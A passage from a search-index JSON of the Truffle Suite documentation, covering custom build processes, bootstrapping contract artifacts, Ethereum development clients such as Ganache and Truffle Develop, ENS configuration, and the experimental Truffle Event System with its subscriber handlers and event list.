with which to integrate with Truffle, detailed above.", "title": "Run an external command"}, {"location": "docs/truffle/concepts/build-processes/#provide-a-custom-function", "text": "You can also provide a custom build function like the one below. Note you're given a plethora of information about your project which you can use to integrate tightly with Truffle. module . exports = { build : function ( options , callback ) { // Do something when a build is required. `options` contains these values: // // working_directory: root location of the project // contracts_directory: root directory of .sol files // destination_directory: directory where truffle expects the built assets (important for `truffle serve`) } }", "title": "Provide a custom function"}, {"location": "docs/truffle/concepts/build-processes/#create-a-custom-module", "text": "You could also create a module or object that implements the builder interface (i.e., is an object which contains a build function like the one above). This is great for those who want to maintain tighter integration with Truffle and publish a package to make everyone else's lives easier. Here's an example using Truffle's default builder: var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder (...) // specify the default builder configuration here. }", "title": "Create a custom module"}, {"location": "docs/truffle/concepts/build-processes/#bootstrap-your-application", "text": "Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps: 1) Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. 2) Turn those .json contract artifacts into contract abstractions that are easy to use, via @truffle/contract . 3) Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist (DEPRECATED) , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. 4) Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"@truffle/contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://127.0.0.1:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.", "title": "Bootstrap your application"}, {"location": "docs/truffle/concepts/ethereum-client-types/", "text": "Ethereum client types \u00b6 There are many Ethereum clients to choose from. We recommend different clients depending on whether you are developing or deploying. Develop \u00b6 Ganache \u00b6 We recommend Ganache , a personal blockchain for Ethereum development that runs on your desktop. Part of the Truffle Suite, Ganache simplifies dapp development by placing your contracts and transactions front and center. Using Ganache you can quickly see how your application affects the blockchain, and introspect details like your accounts, balances, contract creations and gas costs. You can also fine tune Ganache's advanced mining controls to better suit your needs. Ganache is available for Windows, Mac and Linux, and you can download it here . Ganache, when launched, runs on http://127.0.0.1:7545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) The mnemonic will persist across restarts of Ganache, though it can be changed to be randomly generated. You can also input your own . Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Truffle Develop \u00b6 We also recommend using Truffle Develop, a development blockchain built directly into Truffle. Truffle Develop helps you set up an integrated blockchain environment with a single command, no installation required. Run Truffle Develop by typing the following into a terminal: truffle develop This will run the client on http://127.0.0.1:9545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) When you run truffle develop for the first time it will generate a random mnemonic that will persist for you and you alone. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Once launched, Truffle Develop will provide you with a console you can use to run all available Truffle commands. These commands are input by omitting the truffle prefix. So, for example, to compile your smart contracts, instead of typing truffle compile , you need to only type compile . To read more about interacting with the console, please see the Using the Console section. Ganache CLI \u00b6 Ganache also has a command-line interface for those who aren't working from a graphical environment. Great for automated testing and continuous integration environments, Ganache CLI runs headless and can be configured to serve all your development needs. Ganache CLI processes transactions instantly instead of waiting for the default block time, so you can test that your code works quickly. It also tells you immediately when your smart contracts run into errors, and integrates directly with Truffle to reduce test runtime up to 90% compared to other clients. Learn more about Ganache CLI . Deploy to public networks \u00b6 There are many official and unofficial Ethereum clients available for you to use. The following is a short list: Geth (go-ethereum): https://github.com/ethereum/go-ethereum WebThree (cpp-ethereum): https://github.com/ethereum/cpp-ethereum Hyperledger Besu (java): https://github.com/hyperledger/besu Parity: https://github.com/paritytech/parity Nethermind: https://github.com/NethermindEth/nethermind More: https://ethereum.org/developers/#clients--running-your-own-node These are full client implementations that include mining, networking, blocks and transaction processing. You should use these clients after you've sufficiently tested your dapp with Ganache or Truffle Develop and you're ready to deploy to your desired Ethereum network. Deploy to private networks \u00b6 Private networks utilize the same technology as with live networks, but with a different configuration. So you can configure any of the Ethereum clients mentioned above to run a private network, and deploy to it in exactly the same way.", "title": "Ethereum client types"}, {"location": "docs/truffle/concepts/ethereum-client-types/#ethereum-client-types", "text": "There are many Ethereum clients to choose from. We recommend different clients depending on whether you are developing or deploying.", "title": "Ethereum client types"}, {"location": "docs/truffle/concepts/ethereum-client-types/#develop", "text": "", "title": "Develop"}, {"location": "docs/truffle/concepts/ethereum-client-types/#ganache", "text": "We recommend Ganache , a personal blockchain for Ethereum development that runs on your desktop. Part of the Truffle Suite, Ganache simplifies dapp development by placing your contracts and transactions front and center. Using Ganache you can quickly see how your application affects the blockchain, and introspect details like your accounts, balances, contract creations and gas costs. You can also fine tune Ganache's advanced mining controls to better suit your needs. Ganache is available for Windows, Mac and Linux, and you can download it here . Ganache, when launched, runs on http://127.0.0.1:7545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) The mnemonic will persist across restarts of Ganache, though it can be changed to be randomly generated. You can also input your own . Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all!", "title": "Ganache"}, {"location": "docs/truffle/concepts/ethereum-client-types/#truffle-develop", "text": "We also recommend using Truffle Develop, a development blockchain built directly into Truffle. Truffle Develop helps you set up an integrated blockchain environment with a single command, no installation required. Run Truffle Develop by typing the following into a terminal: truffle develop This will run the client on http://127.0.0.1:9545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) When you run truffle develop for the first time it will generate a random mnemonic that will persist for you and you alone. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Once launched, Truffle Develop will provide you with a console you can use to run all available Truffle commands. These commands are input by omitting the truffle prefix. So, for example, to compile your smart contracts, instead of typing truffle compile , you need to only type compile . To read more about interacting with the console, please see the Using the Console section.", "title": "Truffle Develop"}, {"location": "docs/truffle/concepts/ethereum-client-types/#ganache-cli", "text": "Ganache also has a command-line interface for those who aren't working from a graphical environment. Great for automated testing and continuous integration environments, Ganache CLI runs headless and can be configured to serve all your development needs. Ganache CLI processes transactions instantly instead of waiting for the default block time, so you can test that your code works quickly. It also tells you immediately when your smart contracts run into errors, and integrates directly with Truffle to reduce test runtime up to 90% compared to other clients. Learn more about Ganache CLI .", "title": "Ganache CLI"}, {"location": "docs/truffle/concepts/ethereum-client-types/#deploy-to-public-networks", "text": "There are many official and unofficial Ethereum clients available for you to use. The following is a short list: Geth (go-ethereum): https://github.com/ethereum/go-ethereum WebThree (cpp-ethereum): https://github.com/ethereum/cpp-ethereum Hyperledger Besu (java): https://github.com/hyperledger/besu Parity: https://github.com/paritytech/parity Nethermind: https://github.com/NethermindEth/nethermind More: https://ethereum.org/developers/#clients--running-your-own-node These are full client implementations that include mining, networking, blocks and transaction processing. You should use these clients after you've sufficiently tested your dapp with Ganache or Truffle Develop and you're ready to deploy to your desired Ethereum network.", "title": "Deploy to public networks"}, {"location": "docs/truffle/concepts/ethereum-client-types/#deploy-to-private-networks", "text": "Private networks utilize the same technology as with live networks, but with a different configuration. So you can configure any of the Ethereum clients mentioned above to run a private network, and deploy to it in exactly the same way.", "title": "Deploy to private networks"}, {"location": "docs/truffle/concepts/ethereum-name-service/", "text": "Ethereum Name Service \u00b6 Truffle has a built-in Ethereum Name Service (ENS) integration. ENS is a mechanism that allows for the mapping of human readable names to Ethereum addresses or other resources. With ENS enabled, Truffle allows you to use ENS names when interacting with your contracts and it will resolve them for you. Wherever you can use an address in your transaction parameters, you can use an ENS name as long as you are able to connect successfully to an ENS registry. For more information on the Ethereum Name Service, see the ENS website . Configuration \u00b6 In order to use ENS features in your project, you must first enable it in your Truffle config ( truffle-config.js ). In the config, you must specify an ens property and set ens.enabled to true . The simplest configuration you would have is the following in your Truffle config: module . exports = { ens : { enabled : true } } By default, Truffle connects to the official, ENS-deployed registries. These four registries can be found on: Mainnet Ropsten Rinkeby Goerli If a valid provider is supplied for one of these four networks, Truffle will connect and use the official registry for that particular network; that is, unless a different registry address is specified in the config. If you need to specify a different registry, you can enter it in your config for the <networkName>.ens.registry.address property. If your network name were myNetwork then this might look like: module . exports = { networks : { myNetwork : { host : \"localhost\" , port : 8000 , network_id : \"*\" , ens : { registry : { address : \"0x1234567890123456789012345678901234567890\" } } } }, ens : { enabled : true } } If you are not connected to one of the above four networks and do not supply a registry address. Truffle will attempt to deploy a registry for you to use. See the section below on automatic registry deployment for more information. It must be noted that the registry address you supply needs to agree with whatever provider is present otherwise ENS resolution will not work. In other words, if you supply a provider for Kovan, you must also supply a registry address for an ENS registry on the Kovan network (since Kovan does not have an official ENS registry deployment). As was stated above, however, you do not need to supply a registry address for the above networks unless you want to use a custom ENS registry. ens module methods and properties \u00b6 deployer.ens.registryAddress This property returns the address of the registry that Truffle is connected to. deployer.ens.setAddress() As part of this ENS integration, a new ens module is available on the deployer object available during migration functions. Currently there is a single method on this module named setAddress . If you own a domain name, you can use this method to deploy a resolver and set its address. If the resolver already exists, it will set the address that the resolver references if it is not the same as the input address. The signature for this method is setAddress(name: string, addressOrContract: string | TruffleContractInstance>, txParams: object) . A quick explanation of these parameters follows: The name parameter describes the name for which to set the resolver address. This name will look something like \"myName.eth\". The addressOrContract parameter must either be a string or a Truffle contract object that has an address property. If it is a string it must be an Ethereum address. If a Truffle contract has been deployed on the network you are using, then you can use that object as an argument. It will use that contract's address to set the resolver target. The txParams parameter is an object that must contain a from property that specifies the address to send the transaction from. This must be the address that owns the domain in question. If this address does not own the domain then the transaction will fail. Automatic registry deployment \u00b6 Another feature of this integration is the ability to deploy an ENS registry on a network. This would be useful when developing locally and testing. If Truffle cannot connect to an ENS registry on the network you are using, it will check to see if you have \"dev mode\" enabled. If you do, it will attempt to deploy a new registry on the network you are running a migration on. It will also set ownership for the names used in calls to setAddress such that those calls will be successful.", "title": "Ethereum Name Service support"}, {"location": "docs/truffle/concepts/ethereum-name-service/#ethereum-name-service", "text": "Truffle has a built-in Ethereum Name Service (ENS) integration. ENS is a mechanism that allows for the mapping of human readable names to Ethereum addresses or other resources. With ENS enabled, Truffle allows you to use ENS names when interacting with your contracts and it will resolve them for you. Wherever you can use an address in your transaction parameters, you can use an ENS name as long as you are able to connect successfully to an ENS registry. For more information on the Ethereum Name Service, see the ENS website .", "title": "Ethereum Name Service"}, {"location": "docs/truffle/concepts/ethereum-name-service/#configuration", "text": "In order to use ENS features in your project, you must first enable it in your Truffle config ( truffle-config.js ). In the config, you must specify an ens property and set ens.enabled to true . The simplest configuration you would have is the following in your Truffle config: module . exports = { ens : { enabled : true } } By default, Truffle connects to the official, ENS-deployed registries. These four registries can be found on: Mainnet Ropsten Rinkeby Goerli If a valid provider is supplied for one of these four networks, Truffle will connect and use the official registry for that particular network; that is, unless a different registry address is specified in the config. If you need to specify a different registry, you can enter it in your config for the <networkName>.ens.registry.address property. If your network name were myNetwork then this might look like: module . exports = { networks : { myNetwork : { host : \"localhost\" , port : 8000 , network_id : \"*\" , ens : { registry : { address : \"0x1234567890123456789012345678901234567890\" } } } }, ens : { enabled : true } } If you are not connected to one of the above four networks and do not supply a registry address. Truffle will attempt to deploy a registry for you to use. See the section below on automatic registry deployment for more information. It must be noted that the registry address you supply needs to agree with whatever provider is present otherwise ENS resolution will not work. In other words, if you supply a provider for Kovan, you must also supply a registry address for an ENS registry on the Kovan network (since Kovan does not have an official ENS registry deployment). As was stated above, however, you do not need to supply a registry address for the above networks unless you want to use a custom ENS registry.", "title": "Configuration"}, {"location": "docs/truffle/concepts/ethereum-name-service/#ens-module-methods-and-properties", "text": "deployer.ens.registryAddress This property returns the address of the registry that Truffle is connected to. deployer.ens.setAddress() As part of this ENS integration, a new ens module is available on the deployer object available during migration functions. Currently there is a single method on this module named setAddress . If you own a domain name, you can use this method to deploy a resolver and set its address. If the resolver already exists, it will set the address that the resolver references if it is not the same as the input address. The signature for this method is setAddress(name: string, addressOrContract: string | TruffleContractInstance>, txParams: object) . A quick explanation of these parameters follows: The name parameter describes the name for which to set the resolver address. This name will look something like \"myName.eth\". The addressOrContract parameter must either be a string or a Truffle contract object that has an address property. If it is a string it must be an Ethereum address. If a Truffle contract has been deployed on the network you are using, then you can use that object as an argument. It will use that contract's address to set the resolver target. The txParams parameter is an object that must contain a from property that specifies the address to send the transaction from. This must be the address that owns the domain in question. If this address does not own the domain then the transaction will fail.", "title": "ens module methods and properties"}, {"location": "docs/truffle/concepts/ethereum-name-service/#automatic-registry-deployment", "text": "Another feature of this integration is the ability to deploy an ENS registry on a network. This would be useful when developing locally and testing. If Truffle cannot connect to an ENS registry on the network you are using, it will check to see if you have \"dev mode\" enabled. If you do, it will attempt to deploy a new registry on the network you are running a migration on. It will also set ownership for the names used in calls to setAddress such that those calls will be successful.", "title": "Automatic registry deployment"}, {"location": "docs/truffle/concepts/event-system/", "text": "Truffle Event System \u00b6 Note : The Truffle Event System is currently an experimental feature and we anticipate that it will be developing and changing in the near future. Please keep this in mind when using this feature as we cannot promise that its architecture or the API will remain the same until we declare it as stable. Please enjoy and if you discover any issues or bugs, we would love it if you created an issue on the Truffle GitHub page . Thank you! The Truffle Event System is a system of hooks implemented in several of the command flows. Truffle commands emit events for specific tasks, passing data relevant to the task. For example, during compilation an event is emitted that contains the names of contracts that are being compiled. Events are currently implemented for the following Truffle command flows: - compile - unbox - obtain We plan to integrate the event system into the rest of Truffle's command flows in future versions of Truffle. How it works \u00b6 All emitted events are named after the task that emits them. What makes Truffle's event system different than an event emitter is that the names of events are \"namespaced\", each part of the name being separated by a colon. The entire name, in whole, is called the \"event name\". A simple example of an event name in the compile command flow is \"compile:start\" . Individual components of event names are \"labels\". The event name \"compile:start\" has two labels: \"compile\" and \"start\" . This particular event is emitted near the very start of the code that runs during compilation. A slightly more complicated name from the unbox command flow is \"unbox:downloadingBox:succeed\" . This event name has three labels: \"unbox\" , \"downloadingBox\" , and \"succeed\" . This event, as you can probably guess, is emitted when a Truffle box has successfully finished downloading during the unbox command flow. Events are often grouped into sub-labels that mark the beginning and end of a process. Paired event names are common, e.g., an event name ends with \":start\" and another that ends with \":succeed\" . These denote the start and successful finish of a certain event. Another common label, \"fail\" , is used to indicate the failure of a certain event. When the event \"compile:start\" is emitted, it means that compilation has started. \"compile:succeed\" lets us know that compilation has completed and \"compile:fail\" tells us that compilation has failed. In order to make use of this system, you are able to provide handlers for any emitted event. These handlers will be executed when matching events are emitted. In the Subscribers section you will find a description of how to attach handlers to events. As was mentioned briefly, some events also provide data to the handlers when emitted. This could be useful for collecting statistics or perhaps to make your own formatted output during development. \"compile:compiledSources\" is an example of an event that provides data about what source files were used during compilation. This data comes in the form of an array of source filenames that you can log to the console, save to a file, or use however you please. In the Currently supported events section you will find a chart of all currently available event names, where they are emitted in the command flow, and what data is available in the handlers for that event. Subscribers \u00b6 In order to react to events you must create a JavaScript file that will be used to create a \"Subscriber\". A Subscriber is a class that manages a group of event handlers. This file is used internally by a Subscriber to indicate what to do when events are emitted. The Subscriber checks two exported fields: initialization and handlers . initialization must be a function. This function is executed when the Subscriber is instantiated at the beginning of all command flows. This function is optional. NOTE: In this function you will have access to the Subscriber itself through the this keyword when your functions are described using function syntax, i.e., function(data){ , not (data) => { . This makes it easy to attach properties and helper methods to the Subscriber that will then be available in your handlers. handlers should be an object whose keys are event names and values are an array of event handler functions. This is where you will describe what functions to run when certain events are fired. The following section describes how to construct event handlers. In order to use this file as a Subscriber you must require() it in your truffle-config.js under the \"subscribers\" object: modules . exports = { networks : { // ... }, subscribers : { mySubscriberName : require ( \"../my-subscriber-config.js\" ), myOtherSubscriberName : require ( \"../my-other-subscriber-config.js\" ) } } How to define your event handlers \u00b6 This section will describe how to create your event handlers. When you are ready to see a couple of examples, see the default subscribers for Truffle. To create your event handlers you will need to populate the handlers object. In order to describe which handlers correspond to which events, you must create at least one \"event matcher\". An event matcher is a string that will be used to match against events that are emitted. An event matcher could be the exact event name, like \"compile:start\" , or you may use wildcard characters ( \"*\" and \"**\" ) to match multiple events. A single asterisk ( \"*\" ) is used to match a single label within an event name. The event matcher \"unbox:*\" would match any event name that has exactly two labels and starts with \"unbox\" . \"unbox:*\" would match \"unbox:start\" and \"unbox:succeed\" but not \"unbox:downloadingBox:start\" since that has three labels. Nor would it match \"compile:start\" since the first word does not match \"unbox\" . A double asterisk is used to match one or more labels in an event name. So the event matcher \"unbox:\\**\" would match any event name that starts with \" unbox\" regardless of how many other labels the event name has. This means that it would match \"unbox:start\" as well as \"unbox:preparingToDownload:succeed\" . The matcher \"**:succeed\" would match \"fetchSolcList:succeed\" and \"unbox:preparingToDownload:succeed\" . In this way you are able to write handlers that match against batches of events. The event matcher string must be a key in the handlers object whose value must be an array of functions. These functions will be executed when that event matcher matches an emitted event. Every time an event matcher matches an emitted event, each of its functions will be executed. Here is a simple \"hello world\" example: module . exports = { handlers : { \"compile:start\" : [ function () { console . log ( \"hello world!\" ); } ] } }; In the above example, every time the \"compile:start\" event is emitted, \"hello world!\" will be logged to the console. NOTE: Currently you must use function syntax when creating the handler functions in order to have the appropriate this value. You can use arrow functions in your handler functions, but you will lose the this reference to the Subscriber if you do so. More on subscribers \u00b6 When you are creating your handlers, you will have access to Subscriber class methods. Most of these shouldn't be used directly except for the removeListener method. If at some point you need to remove a listener that was added, you can call this.removeListener(<eventMatcher>) to \"detach\" the handlers listed under that specific event matcher. You will also have access to everything that you made references to in the initialization function. For example: if I wanted to use an external library, perhaps one for colorful logging, I would require it in my JavaScript and create a reference to it in the initialization like so: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, // ...... }; I would then be able to access this.colors in my handlers property! So extending the example above could yield the following code: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, handlers : { \"compile:compiledSources\" : [ function ( data ) { const { sourceFileNames } = data ; const message = this . colors . rainbow ( `The source files are ${ sourceFileNames } ` ); console . log ( message ); } ] } }; This would log the source filenames in rainbow colors whenever the \"compile:compiledSources\" event is emitted. Remember, some events (not all) provide data to your handlers at the time of execution. The \"compile:compiledSources\" provides an array of all source filenames to this particular handler. Check the chart below to see which events are provided with what data. Reminder: The this in your Subscriber files refers to the Subscriber class that is instantiated from the file you create and not the this in the file. Currently supported events \u00b6 This section lists all events currently implemented in Truffle. They are organized by command and contain three pieces of information: the event name, when it is emitted, and the specific data, if any, that is passed along to the handlers. truffle compile \u00b6 \"compile:start\" \u00b6 Emitted at the start of the command flow. No data available for this event. \"compile:succeed\" \u00b6 Emitted at the end of the command flow. { contractBuildDirectory: <string: directory where artifacts were saved>, compilersInfo: { <compilerName>: { version: <string: version of compiler>, }, ...one entry per compiler used } } \"compile:sourcesToCompile\" \u00b6 Emitted before sources are compiled. { sourceFileNames: [ <string: filenames of sources to compile>, ...one string entry for each file ] } \"compile:warnings\" \u00b6 Emitted after sources are compiled. { warnings: [ <string: warnings created by the compiler during compilation>, ...one string entry for each warning ] } \"compile:nothingToCompile\" \u00b6 Emitted after attempted compilation if no compilation was needed No data available for this event. truffle obtain \u00b6 \"obtain:start\" \u00b6 Emitted at the start of the command flow. No data available for this event. \"obtain:succeed\" \u00b6 Emitted at the end of the command flow. { compiler: { name: <string: name of compiler obtained>, version: <string: version of compiler obtained> } } \"obtain:fail\" \u00b6 Emitted in case the obtain command fails. No data available for this event. \"downloadCompiler:start\" \u00b6 Emitted before attempting to download a compiler. { attemptNumber: <number: what number attempt at downloading the compiler> } \"downloadCompiler:succeed\" \u00b6 Emitted after successfully downloading a compiler No data available for this event. \"fetchSolcList:start\" \u00b6 Emitted before fetching the list of available versions of the Solidity compiler No data available for this event. \"fetchSolcList:succeed\" \u00b6 Emitted after fetching the list of available versions of the Solidity compiler No data available for this event. \"fetchSolcList:fail\" \u00b6 Emitted emitted if downloading the list of Solidity compiler versions fails No data available for this event. truffle unbox \u00b6 \"unbox:start\" \u00b6 Emitted at the start of command flow. No data available for this event. \"unbox:succeed\" \u00b6 Emitted at the end of command flow. { boxConfig: <object: contents of the `truffle-box.json` for the given box> } \"unbox:fail\" \u00b6 Emitted if the unbox fails. No data available for this event. \"unbox:preparingToDownload:start\" \u00b6 Emitted before setting up a temporary directory for the downloaded contents. No data available for this event. \"unbox:preparingToDownload:succeed\" \u00b6 Emitted after creating the temporary directory for the downloaded contents. No data available for this event. \"unbox:downloadingBox:start\" \u00b6 Emitted before attempting to download the box contents. No data available for this event. \"unbox:downloadingBox:succeed\" \u00b6 Emitted after downloading the box contents. No data available for this event. \"unbox:cleaningTempFiles:start\" \u00b6 Emitted before removing the temporary files. No data available for this event. \"unbox:cleaningTempFiles:succeed\" \u00b6 Emitted after removing the temporary files. No data available for this event. \"unbox:settingUpBox:start\" \u00b6 Emitted before installing box dependencies. No data available for this event. \"unbox:settingUpBox:succeed\" \u00b6 Emitted after installing box dependencies. No data available for this event.", "title": "Truffle Event System"}, {"location": "docs/truffle/concepts/event-system/#truffle-event-system", "text": "Note : The Truffle Event System is currently an experimental feature and we anticipate that it will be developing and changing in the near future. Please keep this in mind when using this feature as we cannot promise that its architecture or the API will remain the same until we declare it as stable. Please enjoy and if you discover any issues or bugs, we would love it if you created an issue on the Truffle GitHub page . Thank you! The Truffle Event System is a system of hooks implemented in several of the command flows. Truffle commands emit events for specific tasks, passing data relevant to the task. For example, during compilation an event is emitted that contains the names of contracts that are being compiled. Events are currently implemented for the following Truffle command flows: - compile - unbox - obtain We plan to integrate the event system into the rest of Truffle's command flows in future versions of Truffle.", "title": "Truffle Event System"}, {"location": "docs/truffle/concepts/event-system/#how-it-works", "text": "All emitted events are named after the task that emits them. What makes Truffle's event system different than an event emitter is that the names of events are \"namespaced\", each part of the name being separated by a colon. The entire name, in whole, is called the \"event name\". A simple example of an event name in the compile command flow is \"compile:start\" . Individual components of event names are \"labels\". The event name \"compile:start\" has two labels: \"compile\" and \"start\" . This particular event is emitted near the very start of the code that runs during compilation. A slightly more complicated name from the unbox command flow is \"unbox:downloadingBox:succeed\" . This event name has three labels: \"unbox\" , \"downloadingBox\" , and \"succeed\" . This event, as you can probably guess, is emitted when a Truffle box has successfully finished downloading during the unbox command flow. Events are often grouped into sub-labels that mark the beginning and end of a process. Paired event names are common, e.g., an event name ends with \":start\" and another that ends with \":succeed\" . These denote the start and successful finish of a certain event. Another common label, \"fail\" , is used to indicate the failure of a certain event. When the event \"compile:start\" is emitted, it means that compilation has started. \"compile:succeed\" lets us know that compilation has completed and \"compile:fail\" tells us that compilation has failed. In order to make use of this system, you are able to provide handlers for any emitted event. These handlers will be executed when matching events are emitted. In the Subscribers section you will find a description of how to attach handlers to events. As was mentioned briefly, some events also provide data to the handlers when emitted. This could be useful for collecting statistics or perhaps to make your own formatted output during development. \"compile:compiledSources\" is an example of an event that provides data about what source files were used during compilation. This data comes in the form of an array of source filenames that you can log to the console, save to a file, or use however you please. In the Currently supported events section you will find a chart of all currently available event names, where they are emitted in the command flow, and what data is available in the handlers for that event.", "title": "How it works"}, {"location": "docs/truffle/concepts/event-system/#subscribers", "text": "In order to react to events you must create a JavaScript file that will be used to create a \"Subscriber\". A Subscriber is a class that manages a group of event handlers. This file is used internally by a Subscriber to indicate what to do when events are emitted. The Subscriber checks two exported fields: initialization and handlers . initialization must be a function. This function is executed when the Subscriber is instantiated at the beginning of all command flows. This function is optional. NOTE: In this function you will have access to the Subscriber itself through the this keyword when your functions are described using function syntax, i.e., function(data){ , not (data) => { . This makes it easy to attach properties and helper methods to the Subscriber that will then be available in your handlers. handlers should be an object whose keys are event names and values are an array of event handler functions. This is where you will describe what functions to run when certain events are fired. The following section describes how to construct event handlers. In order to use this file as a Subscriber you must require() it in your truffle-config.js under the \"subscribers\" object: modules . exports = { networks : { // ... }, subscribers : { mySubscriberName : require ( \"../my-subscriber-config.js\" ), myOtherSubscriberName : require ( \"../my-other-subscriber-config.js\" ) } }", "title": "Subscribers"}, {"location": "docs/truffle/concepts/event-system/#how-to-define-your-event-handlers", "text": "This section will describe how to create your event handlers. When you are ready to see a couple of examples, see the default subscribers for Truffle. To create your event handlers you will need to populate the handlers object. In order to describe which handlers correspond to which events, you must create at least one \"event matcher\". An event matcher is a string that will be used to match against events that are emitted. An event matcher could be the exact event name, like \"compile:start\" , or you may use wildcard characters ( \"*\" and \"**\" ) to match multiple events. A single asterisk ( \"*\" ) is used to match a single label within an event name. The event matcher \"unbox:*\" would match any event name that has exactly two labels and starts with \"unbox\" . \"unbox:*\" would match \"unbox:start\" and \"unbox:succeed\" but not \"unbox:downloadingBox:start\" since that has three labels. Nor would it match \"compile:start\" since the first word does not match \"unbox\" . A double asterisk is used to match one or more labels in an event name. So the event matcher \"unbox:\\**\" would match any event name that starts with \" unbox\" regardless of how many other labels the event name has. This means that it would match \"unbox:start\" as well as \"unbox:preparingToDownload:succeed\" . The matcher \"**:succeed\" would match \"fetchSolcList:succeed\" and \"unbox:preparingToDownload:succeed\" . In this way you are able to write handlers that match against batches of events. The event matcher string must be a key in the handlers object whose value must be an array of functions. These functions will be executed when that event matcher matches an emitted event. Every time an event matcher matches an emitted event, each of its functions will be executed. Here is a simple \"hello world\" example: module . exports = { handlers : { \"compile:start\" : [ function () { console . log ( \"hello world!\" ); } ] } }; In the above example, every time the \"compile:start\" event is emitted, \"hello world!\" will be logged to the console. NOTE: Currently you must use function syntax when creating the handler functions in order to have the appropriate this value. You can use arrow functions in your handler functions, but you will lose the this reference to the Subscriber if you do so.", "title": "How to define your event handlers"}, {"location": "docs/truffle/concepts/event-system/#more-on-subscribers", "text": "When you are creating your handlers, you will have access to Subscriber class methods. Most of these shouldn't be used directly except for the removeListener method. If at some point you need to remove a listener that was added, you can call this.removeListener(<eventMatcher>) to \"detach\" the handlers listed under that specific event matcher. You will also have access to everything that you made references to in the initialization function. For example: if I wanted to use an external library, perhaps one for colorful logging, I would require it in my JavaScript and create a reference to it in the initialization like so: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, // ...... }; I would then be able to access this.colors in my handlers property! So extending the example above could yield the following code: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, handlers : { \"compile:compiledSources\" : [ function ( data ) { const { sourceFileNames } = data ; const message = this . colors . rainbow ( `The source files are ${ sourceFileNames } ` ); console . log ( message ); } ] } }; This would log the source filenames in rainbow colors whenever the \"compile:compiledSources\" event is emitted. Remember, some events (not all) provide data to your handlers at the time of execution. The \"compile:compiledSources\" provides an array of all source filenames to this particular handler. Check the chart below to see which events are provided with what data. Reminder: The this in your Subscriber files refers to the Subscriber class that is instantiated from the file you create and not the this in the file.", "title": "More on subscribers"}, {"location": "docs/truffle/concepts/event-system/#currently-supported-events", "text": "This section lists all events currently implemented in Truffle. They are organized by command and contain three pieces of information: the event name, when it is emitted, and the specific data, if any, that is passed along to the handlers.", "title": "Currently supported events"}, {"location": "docs/truffle/concepts/event-system/#truffle-compile", "text": "", "title": "truffle compile"}, {"location": "docs/truffle/concepts/event-system/#compilestart", "text": "Emitted at the start of the command flow. No data available for this event.", "title": "\"compile:start\""}, {"location": "docs/truffle/concepts/event-system/#compilesucceed", "text": "Emitted at the end of the command flow. { contractBuildDirectory: <string: directory where artifacts were saved>, compilersInfo: { <compilerName>: { version: <string: version of compiler>, }, ...one entry per compiler used } }", "title": "\"compile:succeed\""}, {"location": "docs/truffle/concepts/event-system/#compilesourcestocompile", "text": "Emitted before sources are compiled. { sourceFileNames: [ <string: filenames of sources to compile>, ...one string entry for each file ] }", "title": "\"compile:sourcesToCompile\""}, {"location": "docs/truffle/concepts/event-system/#compilewarnings", "text": "Emitted after sources are compiled. { warnings: [ <string: warnings created by the compiler during compilation>, ...one string entry for each warning ] }", "title": "\"compile:warnings\""}, {"location": "docs/truffle/concepts/event-system/#compilenothingtocompile", "text": "Emitted after attempted compilation if no compilation was needed No data available for this event.", "title": "\"compile:nothingToCompile\""}, {"location": "docs/truffle/concepts/event-system/#truffle-obtain", "text": "", "title": "truffle obtain"}, {"location": "docs/truffle/concepts/event-system/#obtainstart", "text": "Emitted at the start of the command flow. No data available for this event.", "title": "\"obtain:start\""}, {"location": "docs/truffle/concepts/event-system/#obtainsucceed", "text": "Emitted at the end of the command flow. { compiler: { name: <string: name of compiler obtained>, version: <string: version of compiler obtained> } }", "title": "\"obtain:succeed\""}, {"location": "docs/truffle/concepts/event-system/#obtainfail", "text": "Emitted in case the obtain command fails. No data available for this event.", "title": "\"obtain:fail\""}, {"location": "docs/truffle/concepts/event-system/#downloadcompilerstart", "text": "Emitted before attempting to download a compiler. { attemptNumber: <number: what number attempt at downloading the compiler> }", "title": "\"downloadCompiler:start\""}, {"location": "docs/truffle/concepts/event-system/#downloadcompilersucceed", "text": "Emitted after successfully downloading a compiler No data available for this event.", "title": "\"downloadCompiler:succeed\""}, {"location": "docs/truffle/concepts/event-system/#fetchsolcliststart", "text": "Emitted before fetching the list of available versions of the Solidity compiler No data available for this event.", "title": "\"fetchSolcList:start\""}, {"location": "docs/truffle/concepts/event-system/#fetchsolclistsucceed", "text": "Emitted after fetching the list of available versions of the Solidity compiler No data available for this event.", 